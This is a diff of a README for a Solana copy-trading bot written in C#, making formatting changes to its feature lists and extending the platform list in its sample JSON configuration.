@@ -1,6 +1,6 @@
 #  Solana CopyTrading Bot
 
-A powerful and customizable copytrading bot built in **C#** for the **Solana blockchain**, supporting multiple platforms including **Raydium**, **pump.fun**, **Moonshot**, **Photon**, **GMGN**, **BonkBot**, and **Banana Gun**. Designed to mirror transactions from top-performing wallets in real time with full control over filters, liquidity management, and sniping strategies.
+A powerful and customizable copytrading bot built in **C#** for the **Solana blockchain**, supporting multiple platforms including **Raydium**, **Pump.fun**, **Moonshot**, **Photon**, **GMGN**, **BonkBot**, and **Banana Gun**. Designed to mirror transactions from top-performing wallets in real time with full control over filters, liquidity management, and sniping strategies.
 
 ##  Features
 
@@ -9,17 +9,17 @@ A powerful and customizable copytrading bot built in **C#** for the **Solana blo
 
 -  **Customizable Filters**  
   Fine-tune what types of transactions to follow:
-  -- Swaps
-  -- Transfers
-  -- NFT activity
-  -- Token launches
-  -- Liquidity events
+1. Swaps
+2. Transfers
+3. NFT activity
+4. Token launches
+5. Liquidity events
 
 -  **Liquidity Management**  
   Manage how your liquidity is used:
-  -- Auto-adjust based on wallet activity
-  -- Slippage controls
-  -- Minimum liquidity thresholds
+  1. Auto-adjust based on wallet activity
+  2. Slippage controls
+  3. Minimum liquidity thresholds
 
 -  **Token Creation Detection**  
   Detect new token launches and participate based on configurable triggers.
@@ -32,13 +32,13 @@ A powerful and customizable copytrading bot built in **C#** for the **Solana blo
 
 -  **Platform Integration**
   Seamlessly supports multiple Solana-based DEX and trading tools:
-  -- Raydium
-  -- pump.fun
-  -- Moonshot
-  -- Photon
-  -- GMGN
-  -- BonkBot
-  -- Banana Gun
+1. Raydium
+2. Pump.fun
+3. Moonshot
+4. Photon
+5. GMGN
+6. BonkBot
+7. Banana Gun
 
 ## Getting Started
 - [Clone](https://github.com/knightlightst/solana-copytrading-bot/archive/refs/heads/main.zip) the repository and follow the step-by-step setup guide in the documentation.
@@ -62,7 +62,7 @@ All settings are fully configurable through a JSON or UI interface (if implement
     "maxSlippage": 2.5,
     "allowNewTokens": true
   },
-  "platforms": ["Raydium", "PUMP.FUN", "Photon"],
+  "platforms": ["Raydium", "Pump.fun", "Photon","Moonshot","GMGN","BonkBot","Banana Gun"],
   "snipeSettings": {
     "enabled": true,
     "autoApprove": true,
